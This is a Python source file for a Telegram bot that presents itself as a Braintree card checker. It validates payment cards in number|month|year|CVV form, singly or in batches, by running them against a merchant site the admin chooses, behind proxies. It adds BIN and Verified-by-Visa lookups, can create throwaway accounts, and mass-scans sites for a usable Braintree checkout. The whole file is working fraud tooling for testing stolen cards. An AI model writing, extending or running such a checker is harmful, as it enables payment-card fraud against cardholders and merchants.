import os
import asyncio
import logging
import time
import html
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler, MessageHandler, filters
from main import BraintreeAutomatedChecker
import json
import re
import requests
import httpx

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

ADMIN_ID = 1805944073

DATA_FILE = "bot_data.json"

AWAITING_AUTH_MODE, AWAITING_CREDENTIALS = range(2)

def load_data():
    """Load bot data from file"""
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "global_url": None,
        "proxies": [],
        "active_proxy": None,
        "auth_mode": 1,
        "email": None,
        "password": None
    }

def save_data(data):
    """Save bot data to file"""
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

bot_data = load_data()

def is_admin(user_id, username=None):
    """Check if user is admin"""
    return user_id == ADMIN_ID or (username and username.lower() == "mumiru")

def validate_card_format(card_data):
    """Validate card format: cardnumber|mm|yy|cvv"""
    pattern = r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$'
    return bool(re.match(pattern, card_data.strip()))

def get_bin_info(bin_number):
    """Fetch BIN information from API"""
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {
        "brand": "UNKNOWN",
        "type": "UNKNOWN",
        "country_name": "UNKNOWN",
        "country_flag": "🏳",
        "bank": "UNKNOWN"
    }

async def get_vbv_info(card_number: str) -> str:
    """Fetch VBV (Verified by Visa) information for a card"""
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(f"https://ronak.xyz/vbv.php?lista={card_number}")
            if response.status_code == 200:
                return response.text.strip()
    except Exception as e:
        logger.error(f"Error fetching VBV info: {e}")
    return "Unknown"

def format_card_result(card_data, result, time_taken, proxy_used, requester_username, vbv_info="Unknown"):
    """Format card check result with fancy template"""
    parts = card_data.split('|')
    card_number = parts[0]
    bin_number = card_number[:6]
    
    masked_card = f"{card_number[:6]}******{card_number[-4:]}|{parts[1]}|{parts[2]}|{parts[3]}"
    
    bin_info = get_bin_info(bin_number)
    
    status_emoji = "✅" if "✅" in result or "approved" in result.lower() or "success" in result.lower() else "❌"
    
    response_text = f"""み ¡@TOjiCHKBot ↯ ↝ 𝙍𝙚𝙨𝙪𝙡𝙩
𝐛𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐚𝐮𝐭𝐡
━━━━━━━━━
𝐂𝐂 ➜ `{masked_card}`
𝐒𝐓𝐀𝐓𝐔𝐒 ➜ {status_emoji}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}
𝑽𝑩𝑽 ➜ {vbv_info}
━━━━━━━━━
𝐁𝐈𝐍 ➜ {bin_number}
𝐓𝐘𝐏𝐄 ➜ {bin_info.get('brand', 'N/A')} {bin_info.get('type', 'N/A')}
𝐂𝐎𝐔𝐍𝐓𝐑𝐘 ➜ {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}
𝐁𝐀𝐍𝐊 ➜ {bin_info.get('bank', 'N/A')}
━━━━━━━━━
𝗧/𝘁 : {time_taken:.2f}s 𝐏𝐫𝐨𝐱𝐲 : {proxy_used}
𝐑𝐄𝐐 : @{requester_username}
𝐃𝐄𝐕 : @mumiru"""
    
    return response_text

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with command list"""
    if not update.message:
        return
    
    welcome_message = """🛒 **Braintree Card Checker Bot**

📚 **Available Commands:**

**Normal User Commands:**
📌 /br <card|mm|yy|cvv> - Check a single card
📌 /mbr <cards...> - Check multiple cards (max 10 for users, unlimited for admins)

**Admin Commands:**
📌 /setburl <domain> - Set global Shopify domain
📌 /myburl - Show current global domain
📌 /rmburl - Remove global URL
📌 /baddp <proxy> - Add global proxy
📌 /brp - Remove global proxy
📌 /blp - List all proxies
📌 /bcp - Check proxy status
📌 /chkburl <domain> - Test if a Shopify site works
📌 /mbchku - Mass check multiple sites to find best ones

💡 **Examples:**
• /setburl example.braintree.com
• /br 4532123456789012|12|25|123
• /mbr card1|12|25|123 card2|01|26|456

🔄 Use /start to return to this menu."""
    
    await update.message.reply_text(welcome_message, parse_mode='Markdown')

async def br_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check a single card"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /br <card|mm|yy|cvv>\n"
            "Example: /br 4532123456789012|12|25|123"
        )
        return
    
    card_data = ' '.join(context.args)
    
    if not validate_card_format(card_data):
        await update.message.reply_text(
            "❌ Invalid card format!\n"
            "Use: cardnumber|mm|yy|cvv\n"
            "Example: 4532123456789012|12|25|123"
        )
        return
    
    data = load_data()
    site_url = data.get("global_url")
    
    if not site_url:
        await update.message.reply_text(
            "❌ No global URL set! Admin must set a URL using /setburl"
        )
        return
    
    status_msg = await update.message.reply_text("🔄 Checking card... Please wait.")
    
    try:
        start_time = time.time()
        
        checker = BraintreeAutomatedChecker()
        
        proxy_used = "No Proxy"
        if data.get("active_proxy"):
            checker.session.proxies = {
                "http": data["active_proxy"],
                "https": data["active_proxy"]
            }
            proxy_used = "ALIVE"
        
        result = await asyncio.to_thread(checker.check_card, site_url, card_data)
        
        card_number = card_data.split('|')[0]
        vbv_info = await get_vbv_info(card_number)
        
        time_taken = time.time() - start_time
        
        requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
        
        formatted_result = format_card_result(
            card_data,
            result,
            time_taken,
            proxy_used,
            requester_username,
            vbv_info
        )
        
        await status_msg.edit_text(formatted_result, parse_mode='Markdown')
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)}")

async def mbr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check multiple cards (max 10)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mbr <card1|mm|yy|cvv> <card2|mm|yy|cvv> ...\n"
            "Max 10 cards for users, unlimited for admins"
        )
        return
    
    cards = context.args
    
    if len(cards) > 10 and not is_admin(user_id, username):
        await update.message.reply_text("❌ Maximum 10 cards allowed at once! (Admins have unlimited access)")
        return
    
    invalid_cards = [card for card in cards if not validate_card_format(card)]
    if invalid_cards:
        await update.message.reply_text(
            f"❌ Invalid card format detected!\n"
            f"Use: cardnumber|mm|yy|cvv"
        )
        return
    
    data = load_data()
    site_url = data.get("global_url")
    
    if not site_url:
        await update.message.reply_text(
            "❌ No global URL set! Admin must set a URL using /setburl"
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🔄 Checking {len(cards)} cards... Please wait."
    )
    
    proxy_used = "No Proxy"
    if data.get("active_proxy"):
        proxy_used = "ALIVE"
    
    requester_username = update.effective_user.username or update.effective_user.first_name or "Unknown"
    
    all_results = []
    
    for i, card_data in enumerate(cards, 1):
        try:
            await status_msg.edit_text(
                f"🔄 Checking card {i}/{len(cards)}... Please wait."
            )
            
            start_time = time.time()
            
            checker = BraintreeAutomatedChecker()
            
            if data.get("active_proxy"):
                checker.session.proxies = {
                    "http": data["active_proxy"],
                    "https": data["active_proxy"]
                }
            
            result = await asyncio.to_thread(checker.check_card, site_url, card_data)
            
            card_number = card_data.split('|')[0]
            vbv_info = await get_vbv_info(card_number)
            
            time_taken = time.time() - start_time
            
            formatted_result = format_card_result(
                card_data,
                result,
                time_taken,
                proxy_used,
                requester_username,
                vbv_info
            )
            
            all_results.append(formatted_result)
            
        except Exception as e:
            parts = card_data.split('|')
            card_number = parts[0]
            masked = f"{card_number[:6]}******{card_number[-4:]}"
            all_results.append(f"❌ Card {masked}: Error - {str(e)}")
    
    await status_msg.delete()
    
    for result in all_results:
        try:
            await update.message.reply_text(result, parse_mode='Markdown')
        except:
            await update.message.reply_text(result)

async def setburl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set global Braintree domain (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return ConversationHandler.END
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /setburl <domain>\n"
            "Example: /setburl https://example.com"
        )
        return ConversationHandler.END
    
    url = context.args[0]
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    data = load_data()
    data["global_url"] = url
    save_data(data)
    
    context.user_data['pending_url'] = url
    
    await update.message.reply_text(
        f"🌐 URL received: {url}\n\n"
        f"🔐 Choose Authentication Mode:\n\n"
        f"1 - Create new account every time (default)\n"
        f"2 - Login from same account every time\n"
        f"3 - Skip login/register (direct CC check)\n\n"
        f"Reply with 1, 2, or 3"
    )
    
    return AWAITING_AUTH_MODE

async def receive_auth_mode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive authentication mode selection"""
    if not update.message or not update.message.text:
        return ConversationHandler.END
    
    mode_text = update.message.text.strip()
    
    if mode_text not in ['1', '2', '3']:
        await update.message.reply_text(
            "❌ Invalid choice! Please reply with 1, 2, or 3"
        )
        return AWAITING_AUTH_MODE
    
    mode = int(mode_text)
    context.user_data['pending_auth_mode'] = mode
    
    if mode == 2:
        await update.message.reply_text(
            "📧 Please send login credentials in this format:\n\n"
            "email:password\n\n"
            "Example: user@example.com:mypassword"
        )
        return AWAITING_CREDENTIALS
    else:
        data = load_data()
        data["auth_mode"] = mode
        data["email"] = None
        data["password"] = None
        save_data(data)
        
        mode_names = {1: "Create new account", 3: "Skip login/register"}
        await update.message.reply_text(
            f"✅ Configuration saved!\n\n"
            f"🌐 URL: {data['global_url']}\n"
            f"🔐 Auth Mode: {mode_names[mode]}\n\n"
            f"All users will now use this setup for card checking."
        )
        return ConversationHandler.END

async def receive_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive login credentials"""
    if not update.message or not update.message.text:
        return ConversationHandler.END
    
    creds = update.message.text.strip()
    
    if ':' not in creds:
        await update.message.reply_text(
            "❌ Invalid format! Please use:\n"
            "email:password\n\n"
            "Example: user@example.com:mypassword"
        )
        return AWAITING_CREDENTIALS
    
    email, password = creds.split(':', 1)
    mode = context.user_data.get('pending_auth_mode', 2)
    
    data = load_data()
    data["auth_mode"] = mode
    data["email"] = email.strip()
    data["password"] = password.strip()
    save_data(data)
    
    masked_password = '*' * len(password)
    
    await update.message.reply_text(
        f"✅ Configuration saved!\n\n"
        f"🌐 URL: {data['global_url']}\n"
        f"🔐 Auth Mode: Login from same account\n"
        f"📧 Email: {email}\n"
        f"🔑 Password: {masked_password}\n\n"
        f"All users will now use this setup for card checking."
    )
    
    return ConversationHandler.END

async def cancel_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    await update.message.reply_text("❌ Operation cancelled")
    return ConversationHandler.END

async def myburl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show current global domain (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    data = load_data()
    url = data.get("global_url")
    
    if url:
        await update.message.reply_text(f"🌐 Current global URL:\n{url}")
    else:
        await update.message.reply_text("❌ No global URL set yet!")

async def rmburl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove global URL (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    data = load_data()
    data["global_url"] = None
    save_data(data)
    
    await update.message.reply_text("✅ Global URL removed!")

async def baddp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add global proxy (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /baddp <proxy>\n"
            "Example: /baddp http://user:pass@host:port"
        )
        return
    
    proxy = context.args[0]
    
    data = load_data()
    if proxy not in data["proxies"]:
        data["proxies"].append(proxy)
        data["active_proxy"] = proxy
        save_data(data)
        await update.message.reply_text(
            f"✅ Proxy added and set as active:\n{proxy}"
        )
    else:
        await update.message.reply_text("❌ This proxy already exists!")

async def brp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove global proxy (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    data = load_data()
    data["active_proxy"] = None
    save_data(data)
    
    await update.message.reply_text("✅ Active proxy removed! Now using direct connection.")

async def blp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all proxies (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    data = load_data()
    proxies = data.get("proxies", [])
    active = data.get("active_proxy")
    
    if not proxies:
        await update.message.reply_text("❌ No proxies configured!")
        return
    
    message = "📋 **Configured Proxies:**\n\n"
    for i, proxy in enumerate(proxies, 1):
        status = " ✅ (Active)" if proxy == active else ""
        message += f"{i}. `{proxy}`{status}\n"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def bcp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check proxy status (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    data = load_data()
    active_proxy = data.get("active_proxy")
    
    if not active_proxy:
        await update.message.reply_text("❌ No active proxy set!")
        return
    
    status_msg = await update.message.reply_text("🔄 Checking proxy status...")
    
    try:
        proxies = {
            "http": active_proxy,
            "https": active_proxy
        }
        response = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=10)
        
        if response.status_code == 200:
            ip_info = response.json()
            await status_msg.edit_text(
                f"✅ Proxy is working!\n\n"
                f"Proxy: `{active_proxy}`\n"
                f"IP: {ip_info.get('origin', 'Unknown')}",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text("❌ Proxy returned unexpected status!")
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Proxy check failed:\n{str(e)}")

async def chkburl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if a Shopify site works (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /chkburl <domain>\n"
            "Example: /chkburl https://example.com"
        )
        return
    
    url = context.args[0]
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    status_msg = await update.message.reply_text(f"🔄 Testing site: {url}")
    
    try:
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            if 'braintree' in response.text.lower() or 'shopify' in response.text.lower():
                await status_msg.edit_text(
                    f"✅ Site is accessible!\n\n"
                    f"URL: {url}\n"
                    f"Status: {response.status_code}\n"
                    f"Braintree/Shopify detected: Yes"
                )
            else:
                await status_msg.edit_text(
                    f"⚠️ Site is accessible but may not use Braintree!\n\n"
                    f"URL: {url}\n"
                    f"Status: {response.status_code}"
                )
        else:
            await status_msg.edit_text(
                f"❌ Site returned status code: {response.status_code}"
            )
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Error testing site:\n{str(e)}")

async def mbchku_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check multiple sites to find best ones (admin only)"""
    if not update.message or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    if not is_admin(user_id, username):
        await update.message.reply_text("❌ This command is for admins only!")
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ Usage: /mbchku <url1> <url2> <url3> ...\n"
            "Example: /mbchku site1.com site2.com site3.com"
        )
        return
    
    urls = context.args
    status_msg = await update.message.reply_text(
        f"🔄 Testing {len(urls)} sites... Please wait."
    )
    
    results = []
    
    for i, url in enumerate(urls, 1):
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        await status_msg.edit_text(
            f"🔄 Testing site {i}/{len(urls)}... Please wait."
        )
        
        try:
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                has_braintree = 'braintree' in response.text.lower()
                status = "✅ Good" if has_braintree else "⚠️ No Braintree"
                results.append(f"{i}. {url}\n   └ {status}")
            else:
                results.append(f"{i}. {url}\n   └ ❌ Status: {response.status_code}")
                
        except Exception as e:
            results.append(f"{i}. {url}\n   └ ❌ Error: {str(e)[:50]}")
    
    final_message = f"🌐 **Site Check Results**\n\n" + "\n\n".join(results)
    
    if len(final_message) > 4000:
        final_message = final_message[:3900] + "\n\n... (truncated)"
    
    await status_msg.edit_text(final_message, parse_mode='Markdown')

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Log errors"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    bot_token = os.getenv("BOT_TOKEN")
    
    if not bot_token:
        raise ValueError("BOT_TOKEN not found in environment variables!")
    
    bot_token = bot_token.strip()
    
    application = Application.builder().token(bot_token).build()
    
    braintree_url_handler = ConversationHandler(
        entry_points=[CommandHandler('setburl', setburl_command)],
        states={
            AWAITING_AUTH_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_auth_mode)],
            AWAITING_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_credentials)],
        },
        fallbacks=[CommandHandler('cancel', cancel_braintree)],
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("br", br_command))
    application.add_handler(CommandHandler("mbr", mbr_command))
    application.add_handler(braintree_url_handler)
    application.add_handler(CommandHandler("myburl", myburl_command))
    application.add_handler(CommandHandler("rmburl", rmburl_command))
    application.add_handler(CommandHandler("baddp", baddp_command))
    application.add_handler(CommandHandler("brp", brp_command))
    application.add_handler(CommandHandler("blp", blp_command))
    application.add_handler(CommandHandler("bcp", bcp_command))
    application.add_handler(CommandHandler("chkburl", chkburl_command))
    application.add_handler(CommandHandler("mbchku", mbchku_command))
    
    application.add_error_handler(error_handler)
    
    logger.info("🤖 Bot starting...")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
